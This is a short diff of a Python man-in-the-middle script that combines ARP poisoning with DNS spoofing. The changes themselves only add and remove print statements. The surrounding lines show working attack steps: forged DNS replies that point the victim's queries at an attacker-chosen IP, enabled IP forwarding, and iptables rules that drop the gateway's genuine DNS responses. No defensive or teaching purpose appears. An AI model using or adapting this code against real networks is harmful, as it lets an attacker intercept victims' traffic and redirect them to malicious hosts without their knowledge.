@@ -22,7 +22,6 @@ def process_args() -> Tuple[str, str, str]:
 
 
 def spoof_packets(packet, spoof_ip: str) -> None:
-    print(f"Intercepted query: {packet[DNS].qd.qname}")
     ip = IP(dst=packet[IP].src, src=packet[IP].dst)
     udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
     rr = DNSRR(rrname=packet[DNS].qd.qname, ttl=3800, rdata=spoof_ip)
@@ -52,6 +51,7 @@ def get_mac_address(target) -> str:
 
 def configure_system(target: str) -> None:
     subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+    print("Enabled forwarding")
     os.system("iptables -A FORWARD -p udp --dport 53 -j DROP")
     os.system("iptables -A FORWARD -p tcp --dport 53 -j DROP")
     print("Blocking real DNS responses from gateway!")
@@ -72,6 +72,7 @@ def arp_spoof(target_mac: str, target_ip: str, gateway: str) -> None:
 
 def main() -> None:
     target_ip, spoof_ip, gateway = process_args()
+    print(target_ip, gateway, spoof_ip)
     configure_system(target_ip)
     target_mac = get_mac_address(target_ip)
     arp_init(target_mac, target_ip, gateway)
